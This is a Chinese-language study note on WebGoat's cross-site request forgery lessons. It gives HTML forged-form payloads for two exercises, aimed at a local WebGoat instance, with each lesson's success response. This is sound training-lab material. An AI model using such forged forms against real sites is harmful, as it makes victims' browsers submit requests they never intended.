# WebGoat CSRF 学习笔记

参考如下博客文章，十分感谢：

* https://pjchender.dev/internet/is-note-webgoat/#cross-site-scripting-xss
* https://blog.csdn.net/elephantxiang/article/details/117827103



## 1. What is a Cross-site request forgery?



## 2. CSRF with a GET request



## 3. Basic Get CSRF Exercise

CSRF Payload：

```html
<!DOCTYPE html>
<html>
<head>
    <title>3.Basic Get CSRF Exercise</title>
</head>
<body>
    <h1>3.Basic Get CSRF Exercise</h1>
    <form action="http://127.0.0.1:8081/WebGoat/csrf/basic-get-flag" method="POST">
        <input type="hidden" name="csrf" value="false">
        <input type="submit" name="submit">
    </form>
</body>
</html>
```

```
{
  "flag" : 13643,
  "success" : true,
  "message" : "Congratulations! Appears you made the request from a separate host."
}
```



## 4. Post a review on someone else’s behalf

CSRF Payload：因提交评论需要 cooike 以及跨域限制，故可利用 WebWolf 将此文件上传至服务器，然后诱导用户点击

```html
<!DOCTYPE html>
<html>
<head>
    <title>4.Post a review on someone else’s behalf</title>
</head>
<body>
    <h1>4.Post a review on someone else’s behalf</h1>
    <form method="POST" action="http://localhost:8080/WebGoat/csrf/review">
        <input type="text" name="reviewText" placeholder="Add a Review">
        <input type="text" name="stars" placeholder="Add the star number">
        <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
        <input type="submit" name="submit" value="Submit review">
    </form>
</body>
</html>
```

```
{
  "lessonCompleted" : true,
  "feedback" : "It appears you have submitted correctly from another site. Go reload and see if your post is there.",
  "output" : null,
  "assignment" : "ForgedReviews",
  "attemptWasMade" : true
}
```

